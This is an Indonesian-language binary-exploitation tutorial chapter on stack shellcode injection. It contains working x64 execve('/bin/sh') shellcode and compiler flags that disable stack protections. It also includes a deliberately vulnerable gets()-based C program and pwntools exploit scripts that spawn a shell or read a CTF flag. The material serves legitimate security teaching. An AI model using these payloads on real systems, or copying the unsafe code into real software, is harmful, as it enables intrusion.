---
title: 'Chapter 4: Shellcode Injection'
description: 'Teknik injection kode custom untuk arbitrary code execution'
prev:
    text: 'Chapter 3: Ret2Win'
    link: '/RE-Binex/Chapter3_Ret2Win'
next:
    text: 'Back to Index'
    link: '/RE-Binex/'
---

# Chapter 4: Shellcode Injection

::: danger 🏆 Final Boss
**Teknik tertinggi** di seri dasar ini! Jika program target tidak memiliki fungsi berbahaya (`system` / `win`), kita harus **membawa kode kita sendiri**.
:::

## 🤖 Apa itu Shellcode?

**Shellcode** adalah serangkaian instruksi mesin (Assembly) yang diterjemahkan menjadi **bytes mentah** (`\x48\x31...`). Kode ini bertujuan memanggil System Call `execve` untuk menjalankan `/bin/sh`.

::: info 💡 Why "Shell"code?
Disebut "shellcode" karena tujuan utamanya adalah mendapatkan **shell** (command prompt) dari sistem target.
:::

### Karakteristik Shellcode:

- ✅ **Position Independent** - Bisa jalan di alamat memori manapun
- ✅ **Null-byte free** - Tidak boleh ada `\x00` (string terminator)
- ✅ **Compact** - Sesingkat mungkin untuk muat di buffer kecil
- ✅ **Self-contained** - Tidak bergantung library eksternal

## 🧬 Resep Shellcode (Assembly x64)

Berikut adalah contoh Assembly yang menghindari **Null Byte** (`\x00`):

```asm
global _start
section .text
_start:
    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi              ; RSI = 0 (argv = NULL)
    push rsi                  ; Push 0 to stack
    mov rdi, 0x68732f2f6e69622f ; "/bin//sh" in reverse
    push rdi                  ; Push string to stack
    push rsp                  ; Push pointer to string
    pop rdi                   ; RDI = pointer to "/bin/sh"
    push 59                   ; System call number for execve
    pop rax                   ; RAX = 59
    cdq                       ; RDX = 0 (envp = NULL)
    syscall                   ; Call kernel
```

### 🔍 Penjelasan Step-by-Step:

| Instruction                   | Purpose         | Register State              |
| ----------------------------- | --------------- | --------------------------- |
| `xor rsi, rsi`                | Zero out RSI    | RSI = 0                     |
| `push rsi`                    | Push NULL       | Stack: [0]                  |
| `mov rdi, 0x68732f2f6e69622f` | Load "/bin//sh" | RDI = "/bin//sh"            |
| `push rdi`                    | Push string     | Stack: ["/bin//sh", 0]      |
| `push rsp`                    | Push stack ptr  | Stack: [ptr, "/bin//sh", 0] |
| `pop rdi`                     | String to RDI   | RDI = ptr to "/bin//sh"     |
| `push 59`                     | Syscall number  | Stack: [59, ...]            |
| `pop rax`                     | Move to RAX     | RAX = 59 (execve)           |
| `cdq`                         | Zero RDX        | RDX = 0                     |
| `syscall`                     | Execute!        | Call execve()               |

### 🔄 Generate Shellcode Bytes:

```bash
# Assemble & extract
nasm -f elf64 shellcode.asm -o shellcode.o
objcopy -O binary shellcode.o shellcode.bin

# Convert to hex
xxd -i shellcode.bin
# Or with Python
python3 -c "print(open('shellcode.bin','rb').read())"
```

## 🎯 Proses Injeksi

### 1. **Matikan Proteksi**

Kompilasi dengan flag khusus agar Stack bisa dieksekusi:

```bash
gcc -z execstack -fno-stack-protector -no-pie vulnerable.c -o vulnerable
```

| Flag                   | Purpose                   |
| ---------------------- | ------------------------- |
| `-z execstack`         | Make stack executable     |
| `-fno-stack-protector` | Disable canary protection |
| `-no-pie`              | Disable ASLR for binary   |

### 2. **Cari Alamat Buffer**

Gunakan **Info Leak** atau tools untuk mengetahui di mana Buffer berada:

```bash
# Method 1: GDB
gdb ./vulnerable
(gdb) break vulnerable_function
(gdb) run
(gdb) p &buffer
$1 = (char (*)[64]) 0x7fffffffdea0  # Buffer address!

# Method 2: Disable ASLR
setarch x86_64 -R ./vulnerable  # Predictable addresses
```

### 3. **Payload Sandwich** 🥪

```
┌─────────────────────────────────────┐  ← Higher Address
│         Return Address              │  ← Points to NOP sled
├─────────────────────────────────────┤
│            Padding                  │  ← Filler to reach return addr
├─────────────────────────────────────┤
│          Shellcode                  │  ← Our malicious code
│  \x48\x31\xf6\x56\x48\xbf\x2f...   │
├─────────────────────────────────────┤
│         NOP Sled                    │  ← Landing pad (\x90\x90\x90...)
│      \x90\x90\x90\x90\x90...       │
├─────────────────────────────────────┤
│         Buffer Start                │  ← Lower Address
└─────────────────────────────────────┘
```

#### Component Details:

1. **🛬 NOP Sled** (`\x90`): Landasan pacu agar CPU "meluncur" ke shellcode
2. **💀 Shellcode**: Kode jahat yang akan dieksekusi
3. **📦 Padding**: Sampah pengisi ruang
4. **🎯 Return Address**: Alamat Buffer (awal NOP Sled)

## 🐍 Python Exploit Template

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vulnerable'
context.binary = binary
context.arch = 'amd64'

# Shellcode (execve /bin/sh)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

def exploit():
    # Find buffer address (example methods)
    buffer_addr = 0x7fffffffdea0  # From GDB or info leak

    # Build payload
    nop_sled = b"\x90" * 32      # Landing pad
    payload = nop_sled           # Start with NOPs
    payload += shellcode         # Add our shellcode
    payload += b"A" * (72 - len(payload))  # Padding to return address
    payload += p64(buffer_addr)  # Jump back to our buffer

    log.info(f"Buffer address: {hex(buffer_addr)}")
    log.info(f"Payload length: {len(payload)}")
    log.info(f"Shellcode length: {len(shellcode)}")

    # Send payload
    io = process(binary)
    io.sendline(payload)

    # Keep shell alive
    io.interactive()

if __name__ == '__main__':
    exploit()
```

## 🔧 Command Penting

Untuk menahan koneksi stdin agar shell tidak langsung menutup:

```bash
# Method 1: Using cat
(cat payload.bin; cat) | ./vulnerable_program

# Method 2: Using Python
(python3 exploit.py; cat) | ./vulnerable_program

# Method 3: Within Pwntools
io.interactive()  # Built-in shell maintenance
```

## 🧪 Hands-on Example

### Vulnerable Code:

```c
// shellcode_target.c
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buffer[64];
    printf("Enter payload: ");
    gets(buffer);  // Classic vulnerability
    printf("Buffer contents: %s\n", buffer);
}

int main() {
    printf("🎯 Shellcode Injection Challenge\n");
    printf("Buffer address: %p\n", vulnerable);  // Info leak!
    vulnerable();
    printf("Program finished.\n");
    return 0;
}
```

### Compile & Test:

```bash
# Compile with vulnerable settings
gcc -g -z execstack -fno-stack-protector -no-pie shellcode_target.c -o shellcode_target

# Test with simple input
echo "AAAA" | ./shellcode_target

# Create flag file
echo "PWN{sh3llc0d3_m4st3r}" > flag.txt
```

### Advanced Exploit:

```python
#!/usr/bin/env python3
from pwn import *

# Setup
binary = './shellcode_target'
context.binary = binary
context.log_level = 'debug'

# Custom shellcode that reads flag.txt
shellcode = asm('''
    /* open("flag.txt", O_RDONLY) */
    push 0x7478742e
    push 0x67616c66
    mov rdi, rsp
    xor rsi, rsi
    push 2
    pop rax
    syscall

    /* read(fd, buffer, 100) */
    mov rdi, rax
    mov rsi, rsp
    push 100
    pop rdx
    xor rax, rax
    syscall

    /* write(1, buffer, count) */
    push 1
    pop rdi
    mov rdx, rax
    push 1
    pop rax
    syscall

    /* exit(0) */
    push 60
    pop rax
    xor rdi, rdi
    syscall
''')

def exploit():
    io = process(binary)

    # Get buffer address from info leak
    io.recvuntil(b"Buffer address: ")
    leaked_addr = int(io.recvline().strip(), 16)
    log.info(f"Leaked address: {hex(leaked_addr)}")

    # Calculate buffer location (adjust based on analysis)
    buffer_addr = leaked_addr - 0x1000  # Example offset

    # Build payload
    nop_sled = b"\x90" * 20
    payload = nop_sled + shellcode
    payload += b"A" * (72 - len(payload))  # Padding
    payload += p64(buffer_addr)            # Return to buffer

    log.info(f"Sending payload of {len(payload)} bytes")
    io.sendline(payload)

    # Get output
    result = io.recvall(timeout=2)
    log.success(f"Result: {result}")

if __name__ == '__main__':
    exploit()
```

## 🛡️ Modern Protections

::: warning ⚠️ Real-world Challenges
Modern systems have multiple protections against shellcode injection:
:::

| Protection         | Description                     | Bypass Techniques       |
| ------------------ | ------------------------------- | ----------------------- |
| **NX/DEP**         | Non-executable stack            | ROP/JOP chains          |
| **ASLR**           | Address randomization           | Info leaks, brute force |
| **Stack Canaries** | Buffer overflow detection       | Canary leaks, fork()    |
| **PIE**            | Position independent executable | Relative addressing     |

## 🎯 Checkpoint

::: details ✅ Apa yang sudah dipelajari?

- [x] Konsep shellcode dan tujuannya
- [x] Assembly x64 untuk system calls
- [x] Teknik menghindari null bytes
- [x] Struktur payload injection (NOP sled + shellcode)
- [x] Methods untuk finding buffer addresses
- [x] Advanced shellcode (file operations)
- [x] Modern protection mechanisms
      :::

---

::: tip 🎉 Congratulations!
Selamat! Anda telah menyelesaikan **Journey to Binary Exploitation**!

Dari memahami dasar C, buffer overflow, ret2win, hingga shellcode injection - Anda kini memiliki foundation yang solid dalam binary exploitation.

🏆 **Next Steps:**

- Pelajari **ROP (Return-Oriented Programming)**
- Eksplorasi **heap-based attacks**
- Praktik dengan **CTF challenges**
- Dalami **modern mitigations bypass**

🚀 [Kembali ke Index](/RE-Binex/) | 📚 [Explore More Tutorials](/)
:::
